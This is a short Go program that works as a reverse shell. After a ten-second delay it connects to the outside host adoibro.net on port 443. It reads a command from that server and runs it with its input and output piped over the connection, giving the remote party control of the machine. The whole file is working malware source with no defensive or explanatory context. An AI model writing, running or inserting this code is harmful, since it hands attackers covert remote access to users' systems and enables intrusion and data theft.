package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"
)

const (
	t_secs = 5
)

func main() {

	time.Sleep(10 * time.Second)

	fmt.Printf("Slept a bit, now back to business. Where are our rabbits?")

	time_out := time.Duration(t_secs) * time.Second
	conn, err := net.DialTimeout("tcp", "adoibro.net:443", time_out)

	if err != nil {
		log.Println(err)
		return
	}

	buffer := bufio.NewWriter(conn)
	buffer.WriteString("Following the white rabbit... \n\r")
	buffer.Flush()

	msg, _ := bufio.NewReader(conn).ReadString('\n')

	out := exec.Command(strings.TrimSuffix(msg, "\n"))
	out.Stdin = conn
	out.Stdout = conn
	out.Stderr = conn

	out.Run()
}
